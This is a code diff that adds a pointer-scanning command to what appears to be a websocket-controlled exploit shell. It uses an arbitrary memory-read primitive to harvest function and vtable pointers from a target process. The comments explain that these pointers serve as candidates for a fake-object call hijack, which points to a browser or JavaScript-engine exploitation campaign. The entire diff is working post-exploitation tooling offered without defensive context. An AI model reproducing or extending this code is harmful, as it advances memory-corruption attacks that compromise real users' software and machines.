@@ -4846,6 +4846,51 @@ function _startWsShell(){
         break;
       }
 
+      case 'ptrscan':{
+        /* SHELL: THE POINTER-CLASS HARVEST. The exact-value scan can't
+         * wildcard; the identification-by-call campaign needs the FULL
+         * list of pointers in a value band - the E2 targets (libc-class
+         * imports tolerating RDI = the fake scope) hide in the module's
+         * data band among vtables. Scans [start, start+len) for qwords
+         * in [lo, hi), DEDUPED by value (the same fn ptr recurs across
+         * vtables; unique values maximize candidate diversity), capped
+         * at msg.max (default 64). Band-relative offsets are recorded -
+         * they survive re-entries (BASE moves, the RVA does not). */
+        var start=BigInt(msg.start),len=parseInt(msg.len)||0x10000;
+        var loV=BigInt(msg.lo),hiV=BigInt(msg.hi);
+        var gerrP=null;
+        {
+          var loS=start,hiS=start+BigInt(len);
+          var bandsP=[];
+          if(S.lowB&&S.jfuTop&&S.jfuTop>S.lowB)bandsP.push([S.lowB,S.jfuTop]);
+          if(S.cfr){var cpP=(S.cfr/0x4000n)*0x4000n;bandsP.push([cpP,cpP+0x8000n]);}
+          if(S.BASE)bandsP.push([S.BASE+0x7000000n,S.BASE+0x7400000n]);
+          for(var pb=0;pb<shOkPages.length;pb++)bandsP.push(shOkPages[pb]);
+          var okP=false;
+          for(var pb2=0;pb2<bandsP.length;pb2++){if(loS>=bandsP[pb2][0]&&hiS<=bandsP[pb2][1]){okP=true;break;}}
+          if(!okP&&!msg.force)gerrP='PTRSCAN RANGE NOT IN A PROVEN BAND - append force to override (each 16KB chunk is a separate read; an unmapped chunk kills the session)';
+        }
+        if(gerrP){reply.err=gerrP;break;}
+        var maxP=parseInt(msg.max)||64;
+        var pHits=[],pSeen={};
+        for(var off=0;off<len&&pHits.length<maxP;off+=0x4000){
+          var words;
+          try{words=S.absRead(start+BigInt(off),0x4000);}catch(e){break;}
+          shMarkOk(start+BigInt(off));
+          for(var wi=0;wi<words.length&&pHits.length<maxP;wi++){
+            var v=words[wi];
+            if(v>=loV&&v<hiV&&!pSeen[v]){
+              pSeen[v]=1;
+              pHits.push({addr:'0x'+(start+BigInt(off)+BigInt(wi*8)).toString(16),value:'0x'+v.toString(16),bandoff:'0x'+(start+BigInt(off)+BigInt(wi*8)-start).toString(16)});
+            }
+          }
+        }
+        reply.hits=pHits;
+        reply.count=pHits.length;
+        reply.scanned='0x'+len.toString(16);
+        break;
+      }
+
       case 'deref':{
         var addr=BigInt(msg.addr),depth=parseInt(msg.depth)||2;
         var chain=[];
